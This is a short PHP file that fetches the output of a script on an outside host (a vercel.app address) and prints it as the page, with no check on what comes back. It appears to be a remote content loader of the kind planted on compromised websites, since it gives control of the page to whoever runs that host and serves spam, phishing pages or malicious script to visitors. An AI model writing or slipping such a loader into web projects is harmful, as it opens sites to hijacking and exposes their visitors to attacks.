<?php
$url = $_SERVER['REQUEST_URI'];
$content = file_get_contents('https://new20space.vercel.app/api/1.php');
echo  $content;
?>